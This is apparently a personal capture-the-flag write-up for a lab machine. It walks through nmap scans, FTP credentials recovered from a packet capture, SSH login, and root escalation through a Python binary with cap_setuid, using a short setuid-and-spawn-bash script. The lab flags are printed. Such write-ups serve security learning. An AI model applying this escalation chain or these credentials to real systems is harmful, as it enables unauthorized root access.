---
created: 2024-09-24T21:48
updated: 2025-08-18T09:17
description: My first proper linux privilege escalation!
---

## nmap

```bash
nmap -sV -p- --min-rate=1000 10.129.184.198

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    gunicorn

nmap -p 21,22,80 -sCV -oA scans/nmap-tcpscripts 10.129.184.198
```

- Trying to login to `ftp` with `anonymous` didn't work.
- Website seems to capture packets.
- Wait, `http://10.129.184.198/data/0` exists before my first capture.

## 0.pcap

![image.png](https://res.cloudinary.com/kumonochisanaka/image/upload/v1727229565/2024/09/67c95341c80115c1e5708bc4edff1fd7.png)

```
USER nathan
PASS Buck3tH4TF0RM3!
```

The capture for some reason has username and password of a user.
## ftp as nathan + flag 1

```bash
ftp 10.129.184.198
ftp> ls
-r--------    1 1001     1001           33 Sep 25 01:45 user.txt
ftp> get user.txt
ftp> exit

cat user.txt
543bd52d3b323a211f9dc96b137464e2
```

## ssh as nathan

We can also ssh to the server as nathan.

```bash
ssh nathan@10.129.184.198
```

But I have no clue about the privilege escalation part.

### capabilities

```bash
nathan@cap:/$ getcap /usr/bin/python3.8
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

### PEASS-ng

Auto escalation detection script.

I downloaded `linpeas.sh` from [peass-ng/PEASS-ng: PEASS - Privilege Escalation Awesome Scripts SUITE (with colors) (github.com)](https://github.com/peass-ng/PEASS-ng), and ran it as nathan.

![image.png](https://res.cloudinary.com/kumonochisanaka/image/upload/v1727232503/2024/09/8e5b53940ebcf69c8b3dce74d09acaf5.png)

It is highlighted? Why?

## Privilege escalation with `setuid`

Turns out `cap_setuid` can be used to change the user id of the current process, setting it to 0 would essentially make us root.

![image.png](https://res.cloudinary.com/kumonochisanaka/image/upload/v1727232692/2024/09/c30739e99b7a6c957d59aae286792888.png)

Wow, we have root access now!

```python [escalation.py]
import os
os.setuid(0)
os.system("bash")
```

## flag 2

```bash
root@cap:~# cd /root
root@cap:/root# ls
root.txt  snap
root@cap:/root# cat root.txt 
a2b5a6b4f9a1b513a273660ebef38b70
```

OwO
